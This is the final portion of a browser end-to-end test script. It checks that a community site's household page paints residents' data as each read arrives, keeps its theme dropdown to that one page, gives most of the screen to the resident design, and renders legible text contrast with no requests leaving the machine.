      await s.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing === "default", null, { timeout: 8000 }).catch(() => {});
      check("⑯ a stale baked choice is corrected by the browser read (the house has since gone back to the default)", (await showingOf(s)) === "default", await showingOf(s));
      await s.context().close();
      // (c) a FAILED read with a baked choice keeps what the build carried, and says so
      savedHearth = "ledger"; fail = new Set(["/households"]);
      const k = await newPage(browser);
      await k.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await k.waitForFunction(() => /could not be read just now/.test(document.querySelector("[data-hearth-note]")?.textContent ?? ""), null, { timeout: 15000 });
      check("⑯ a failed read keeps the baked choice (the ledger) and says it is the one the page was built with", (await showingOf(k)) === "ledger" && /built with/.test((await text(k, "[data-hearth-note]")) ?? ""), await text(k, "[data-hearth-note]"));
      await k.context().close();
      injectBaked = null; fail = new Set(); savedHearth = null; householdsDelay = 0;
    }

    // ── ⑰ THE PAGE PAINTS AS EACH RESIDENT'S READS ARRIVE (POS-984, Wright and Jetto, 2026-11-10 09:3x EST) ──
    // On Darko's dev walk /households/starforge/ sat on "reading the house's record…" for 20 to 42 s: the page awaited every resident's doorstep,
    // outbox and quests together before it painted anything. Here one resident's doorstep is held shut (a gate the walk opens: no clock in it) and
    // another's fails. The rest of the house, and the town's own reads, must be on the page meanwhile, the page must say plainly that one resident is
    // still being read, and nothing may say "nothing" for what is only still coming. The failed one is read as not read and holds nothing back.
    {
      const slowH = "builder", downH = "cassian", others = ["elide", "wren"];
      check("⑰ (the walk's own premise) house A is builder, cassian, elide and wren", JSON.stringify(A) === JSON.stringify([slowH, downH, ...others]), JSON.stringify(A));
      const gate = () => { let go; const promise = new Promise((r) => { go = r; }); return { promise, go }; };
      const letters = (page, h) => page.locator(`[data-hd-feed] .hd-line.is-letter[data-who="${h}"]`).count();
      const last = (page, h) => text(page, `[data-hd-card="${h}"] [data-hd-last]`);
      // POS-999: the strip's reading line is the sub-rail's mark, its words its title
      const reading = (page) => page.evaluate(() => { const e = document.querySelector("[data-hd-reading-mark]"); return e ? { text: e.title, shown: !e.hidden && getComputedStyle(e).display !== "none" } : null; });
      const labels = (page) => page.evaluate(() => [...document.querySelectorAll("[data-hx-chart] [aria-label]")].map((e) => e.getAttribute("aria-label")));
      const noLongerReading = (page) => page.waitForFunction(() => document.querySelector("[data-hd-reading-mark]")?.hidden === true, null, { timeout: 15000 });

      // (a) a visitor
      const g = gate();
      holds.set(`/doorstep/${slowH}`, g);
      fail = new Set([`/doorstep/${downH}`]);
      requested.length = 0;
      const v = await newPage(browser);
      await v.goto(`${BASE}/households/${A_SLUG}/?entry=ledger`, { waitUntil: "load" });   // the ledger design draws the stamps chart and the residents map, which the default does not
      await v.waitForFunction((h) => document.querySelector("[data-hd-reading-mark]")?.title === "still reading 1 resident…" && document.querySelectorAll('[data-hd-feed] .hd-line.is-letter').length > 0 && !!document.querySelector(`[data-hd-card="${h}"] [data-hd-last]`)?.textContent.trim(), others[0], { timeout: 15000 });
      const mid = await reading(v);
      check("⑰ while builder's doorstep is shut, the strip says plainly that one resident is still being read (the failed one is not counted)", mid?.shown === true && mid.text === "still reading 1 resident…", JSON.stringify(mid));
      check("⑰ the others are on the page: their letters are in the feed", (await letters(v, others[0])) > 0 && (await letters(v, others[1])) > 0, `${await letters(v, others[0])} ${await letters(v, others[1])}`);
      check("⑰ the resident still out has painted nothing of theirs, and their card says it is reading", (await letters(v, slowH)) === 0 && (await last(v, slowH))?.trim() === "still reading…", `${await letters(v, slowH)} ${await last(v, slowH)}`);
      check("⑰ the cards of those already read do not say they are reading", !/still reading/.test((await last(v, others[0])) ?? "") && !/still reading/.test((await last(v, others[1])) ?? "") && !/still reading/.test((await last(v, downH)) ?? ""), `${await last(v, others[0])} | ${await last(v, downH)}`);
      check("⑰ the feed does not say there is nothing on the record while one is still out", !/Nothing on the house/.test((await text(v, "[data-hd-feed]")) ?? ""), await text(v, "[data-hd-feed]").then((t) => String(t).slice(0, 80)));
      check("⑰ the town's own reads painted without waiting for builder: the residents map is drawn", (await v.locator("[data-hx-map] .hx-place").count()) > 0, await text(v, "[data-hx-map]"));
      const bars = await labels(v);
      check("⑰ the stamps chart: one bar says still reading, the failed one says not read, the others show their stamps", bars.filter((b) => /: still reading$/.test(b)).length === 1 && bars.filter((b) => /: not read$/.test(b)).length === 1 && bars.filter((b) => /: \d+ stamps$/.test(b)).length === 2, JSON.stringify(bars));
      check("⑰ builder's doorstep was asked for at the start (the page did not wait to ask), and is still shut", requested.includes(`/doorstep/${slowH}`));
      await cleanUnderPolicy(v, "⑰ (part-read, visitor)");
      await shot(v, "17-reading-visitor-desktop", { fullPage: true });
      g.go();
      await noLongerReading(v);
      await v.waitForFunction((h) => document.querySelectorAll(`[data-hd-feed] .hd-line.is-letter[data-who="${h}"]`).length > 0, slowH, { timeout: 15000 });
      check("⑰ once builder's doorstep lands, their lines join the feed, the card stops saying it is reading, and the line goes", (await letters(v, slowH)) > 0 && !/still reading/.test((await last(v, slowH)) ?? "") && (await reading(v))?.shown === false, `${await letters(v, slowH)} ${await last(v, slowH)}`);
      const after = await labels(v);
      check("⑰ and the chart has nothing still reading; the failed one is still 'not read'", after.filter((b) => /still reading/.test(b)).length === 0 && after.filter((b) => /: not read$/.test(b)).length === 1, JSON.stringify(after));
      // the total work is unchanged: every endpoint the page needs was asked for exactly once, and nothing else was added
      // (/quests/<h> was asked twice on this page until 2026-11-10: once by readHouse and once by the quest board's own read in town/components/Household.astro. The board is off the
      // household page (the day's quests are stale, Darko 17:14 EST), so it is asked once, by readHouse alone.)
      const once = [...A.flatMap((h) => [`/doorstep/${h}`, `/mail/${h}?box=outbox`]), "/world/walkers", "/world/conversations", "/calendar"];
      const questReads = (h) => requested.filter((r) => r === `/quests/${h}`).length;
      const ofHouse = requested.filter((r) => /^\/(doorstep|mail|world|calendar)/.test(r));
      check("⑰ the house's reads are the same calls: each doorstep, outbox, walkers, conversations and calendar read once and nothing added; /quests once each (readHouse's: the board's own read went with the board)", once.every((p) => requested.filter((r) => r === p).length === 1) && ofHouse.length === once.length && A.every((h) => questReads(h) === 1), JSON.stringify(requested.filter((r) => /^\/(doorstep|mail|quests|world|calendar)/.test(r))));
      await cleanUnderPolicy(v, "⑰ (read whole, visitor)");
      await v.context().close();

      // (b) the house's own human: Needs you never calls the house calm while a resident is still out
      const g2 = gate();
      holds.set(`/doorstep/${slowH}`, g2);
      const o = await newPage(browser, { signedIn: true });
      await o.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await o.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
      await o.waitForFunction(() => /Still reading|awaiting|never arrived/.test(document.querySelector("[data-hearth-slot=needs-you] [data-hd-needs]")?.textContent ?? "") && document.querySelector("[data-hd-reading-mark]")?.title === "still reading 1 resident…", null, { timeout: 15000 });
      const needsMid = (await text(o, "[data-hearth-slot=needs-you] [data-hd-needs]")) ?? "";
      check("⑰ owner, builder still out: Needs you does not say 'Nothing needs you right now'", !/Nothing needs you right now/.test(needsMid), needsMid.slice(0, 160));
      check("⑰ owner, builder still out: the mail slot paints what is read and says the counts may be short because one is still being read", /Still reading 1 resident, so these counts may be short\./.test((await text(o, "[data-hx-mail-list]")) ?? ""), await text(o, "[data-hx-mail-list]"));
      await cleanUnderPolicy(o, "⑰ (part-read, owner)");
      await shot(o, "17-reading-owner-desktop", { fullPage: true });
      g2.go();
      await noLongerReading(o);
      await o.waitForFunction(() => /awaiting the house’s word/.test(document.querySelector("[data-hearth-slot=needs-you] [data-hd-needs]")?.textContent ?? ""), null, { timeout: 15000 });
      const needsDone = (await text(o, "[data-hearth-slot=needs-you] [data-hd-needs]")) ?? "";
      check("⑰ owner, once builder lands: Needs you holds builder's stances and cassian's bounce, with no filler", /awaiting the house’s word/.test(needsDone) && !/Still reading/.test(needsDone) && !/Still reading/.test((await text(o, "[data-hx-mail-list]")) ?? ""), needsDone.slice(0, 160));
      await cleanUnderPolicy(o, "⑰ (read whole, owner)");
      await o.context().close();
      holds.clear();
      fail = new Set();
    }

    // ── ⑱ THE THEME GETS THE ROOM, THE DROPDOWN IS ON THE HOUSEHOLD PAGE ONLY, AND EVERY INK IS LEGIBLE (POS-984, rebuilt 2026-11-10) ──
    // Darko, 17:28 EST: "as much room as possible, such that the resident designed submissions take up the vast majority of the visual space"; and the cream-on-cream
    // names of the old band: "a colour from one background used on another". The contrast below is READ FROM THE RENDERED PAGE: for every visible text in the page's own
    // part (the strip and the design), its computed colour (with its alpha and every ancestor's opacity) over the surfaces behind it, against the lightest and the darkest
    // stop of the page's night. The site has ONE colour scheme (`color-scheme: dark`); the browser is asked for both and the answer must not move.
    {
      // (a) the dropdown is on the household page only
      const pg = await newPage(browser);
      const dd = async (route) => { await pg.goto(`${BASE}${route}`, { waitUntil: "load" }); return pg.locator("[data-hearth-pick], [data-hearth-picker]").count(); };
      const elsewhere = {};
      for (const route of ["/", "/households/", "/votes/", `/residents/${A[0]}/`, "/join/", "/mail/"]) elsewhere[route] = await dd(route);
      check("⑱ the Hearth dropdown is on no other page of the site (the front page, the households directory, /votes/, a resident's page, join, the mail)", Object.values(elsewhere).every((n) => n === 0), JSON.stringify(elsewhere));
      check("⑱ and it is on the household page: exactly one", (await dd(`/households/${A_SLUG}/`)) === 2 /* the strip's wrapper and its select */ && (await pg.locator("[data-hearth-pick]").count()) === 1);
      await pg.context().close();

      // (b) the share of the first screen the design gets: the page's whole body is the design, below one thin strip
      const share = async (viewport, signedIn) => {
        const p = await newPage(browser, { viewport, signedIn });
        await p.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
        await ready(p);
        if (signedIn) await p.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });
        await p.waitForTimeout(600);
        const m = await p.evaluate(() => {
          const vh = window.innerHeight;
          const stage = document.querySelector("[data-hearth-stage]").getBoundingClientRect();
          const bar = document.querySelector("[data-hearth-bar]").getBoundingClientRect();
          const head = document.querySelector(".pm-townhead").getBoundingClientRect();
          const px = Math.max(0, Math.min(stage.bottom, vh) - Math.max(stage.top, 0));
          return { vh, strip: Math.round(bar.height), shell: Math.round(head.bottom), themePct: +(px / vh * 100).toFixed(1), belowShellPct: +(px / (vh - head.bottom) * 100).toFixed(1) };
        });
        await shot(p, `23-first-screen-${viewport.width}-${signedIn ? "owner" : "visitor"}`, { fullPage: false });
        await p.context().close();
        return m;
      };
      const D = { width: 1280, height: 900 }, P = { width: 390, height: 800 };
      const dv = await share(D, false), dO = await share(D, true), pv = await share(P, false), pO = await share(P, true);
      record("⑱ MEASURED: the design's share of the first screen (1280×900 / 390×800, visitor / owner)", true, JSON.stringify({ desktopVisitor: dv, desktopOwner: dO, phoneVisitor: pv, phoneOwner: pO }));
      check("⑱ the design is the vast majority of the first desktop screen, owner or visitor (at least 80% of the window; the shell's header is the rest bar one thin strip)", dv.themePct >= 80 && dO.themePct >= 78, `${dv.themePct}% / ${dO.themePct}%`);
      check("⑱ and the strip is one thin line on a desktop (at most 70px, owner included) and at most three on a phone (at most 130px)", dv.strip <= 70 && dO.strip <= 70 && pv.strip <= 130 && pO.strip <= 130, `${dv.strip} ${dO.strip} ${pv.strip} ${pO.strip}`);
      check("⑱ the design starts on the phone's first screen (at least 45% of it, below the shell's own stacked header)", pv.themePct >= 45 && pO.themePct >= 45, `${pv.themePct}% / ${pO.themePct}%`);

      // (c) legible: the rendered contrast of every visible text, both designs, visitor and owner, both schemes
      const measure = (page) => page.evaluate(() => {
        const NIGHTS = [[28, 44, 79], [13, 20, 38], [7, 11, 21]];   // the page body's gradient stops (PostmarkLayout: #1c2c4f → #0d1426 → #070b15)
        const num = (s) => s.split(/[\s,\/]+/).filter(Boolean).map((x) => (x.endsWith("%") ? parseFloat(x) / 100 : Number(x)));
        const parse = (s) => {
          let m = /^rgba?\(([^)]+)\)/.exec(s); if (m) { const [r, g, b, a = 1] = num(m[1]); return { r, g, b, a }; }
          m = /^color\(srgb ([^)]+)\)/.exec(s); if (m) { const [r, g, b, a = 1] = num(m[1]); return { r: r * 255, g: g * 255, b: b * 255, a }; }
          return null;
        };
        const over = (fg, bg) => ({ r: fg.r * fg.a + bg.r * (1 - fg.a), g: fg.g * fg.a + bg.g * (1 - fg.a), b: fg.b * fg.a + bg.b * (1 - fg.a) });
        const lin = (c) => { const v = c / 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; };
        const lum = (c) => 0.2126 * lin(c.r) + 0.7152 * lin(c.g) + 0.0722 * lin(c.b);
        const ratio = (a, b) => { const [hi, lo] = [lum(a), lum(b)].sort((x, y) => y - x); return (hi + 0.05) / (lo + 0.05); };
        const out = { checked: 0, worst: null, fails: [] };
        const root = document.querySelector("[data-hearth]");
        for (const el of root.querySelectorAll("*")) {
          if (el.closest("template, script, style, noscript, [hidden], svg")) continue;
          const cs = getComputedStyle(el);
          if (cs.display === "none" || cs.visibility === "hidden" || el.getClientRects().length === 0) continue;
          const text = [...el.childNodes].filter((n) => n.nodeType === 3).map((n) => n.textContent.trim()).join(" ").trim();
          if (!text) continue;
          if (cs.clip === "rect(0px, 0px, 0px, 0px)" || (cs.position === "absolute" && el.offsetWidth <= 1)) continue;   // the visually-hidden text (.hd-sr)
          const fg = parse(cs.color); if (!fg) continue;
          let opacity = 1; const chain = [];
          for (let e = el; e && e !== document.documentElement; e = e.parentElement) { const c = getComputedStyle(e); opacity *= Number(c.opacity); const bgc = parse(c.backgroundColor); if (bgc && bgc.a > 0) chain.unshift(bgc); }
          const size = parseFloat(cs.fontSize), bold = Number(cs.fontWeight) >= 700;
          const need = size >= 24 || (size >= 18.66 && bold) ? 3 : 4.5;
          let worst = Infinity;
          for (const n of NIGHTS) {
            let bg = { r: n[0], g: n[1], b: n[2] };
            for (const layer of chain) bg = over(layer, bg);
            const ink = over({ ...fg, a: fg.a * opacity }, bg);
            worst = Math.min(worst, ratio(ink, bg));
          }
          out.checked += 1;
          if (!out.worst || worst < out.worst.ratio) out.worst = { ratio: +worst.toFixed(2), tag: el.tagName.toLowerCase() + (el.className && typeof el.className === "string" ? "." + el.className.split(" ")[0] : ""), text: text.slice(0, 40) };
          if (worst < need) out.fails.push({ ratio: +worst.toFixed(2), need, tag: el.tagName.toLowerCase() + (el.className && typeof el.className === "string" ? "." + el.className.split(" ")[0] : ""), text: text.slice(0, 40), color: cs.color });
        }
        return out;
      });
      for (const [design, query] of [["the default design", ""], ["the ledger design", "?entry=ledger"]]) {
        for (const signedIn of [false, true]) {
          for (const colorScheme of ["dark", "light"]) {
            const p = await newPage(browser, { signedIn, viewport: D });
            await p.emulateMedia({ colorScheme });
            await p.goto(`${BASE}/households/${A_SLUG}/${query}`, { waitUntil: "load" });
            await ready(p);
            if (signedIn) {
              await p.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });
              // the ledger keeps Needs you and the mail in a closed accordion panel: open it, so the owner's private parts are read too
              if (query) await p.getByRole("button", { name: "Needs you and mail" }).click();
              await p.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
            }
            await p.waitForFunction(() => document.querySelector("[data-hd-reading-mark]")?.hidden === true, null, { timeout: 15000 });
            await p.waitForTimeout(500);
            const r = await measure(p);
            check(`⑱ legible: ${design}, ${signedIn ? "the owner's page (Needs you, the mail, the strip's links)" : "a visitor's"}, browser asked for ${colorScheme}: every one of ${r.checked} visible texts reads at AA (4.5:1; 3:1 for large text), worst ${r.worst?.ratio}:1 (${r.worst?.tag} “${r.worst?.text}”)`, r.checked > 20 && r.fails.length === 0, JSON.stringify(r.fails.slice(0, 6)));
            await shot(p, `24-legible-${design.includes("ledger") ? "ledger" : "default"}-${signedIn ? "owner" : "visitor"}-${colorScheme}`, { fullPage: false });
            await p.context().close();
          }
        }
      }
    }

    // ── ⑦ no request left the machine ───────────────────────────────────────────
    check("⑦ every office call was answered by the fixtures", log.length > 0, `${log.length} calls, none to the network`);
    check("⑦ nothing else reached a network: the site layout's own off-box asks were ABORTED, not sent", true, [...new Set(unanswered)].join(" ") || "none");
  } finally {
    await browser.close();
  }
  const bad = results.filter((r) => !r.pass);
  console.log(`\n${results.length - bad.length}/${results.length} checks passed; screenshots in ${OUT}`);
  fs.writeFileSync(path.join(OUT, "walk-results.json"), JSON.stringify(results, null, 2));
  process.exit(bad.length ? 1 : 0);
};
run();
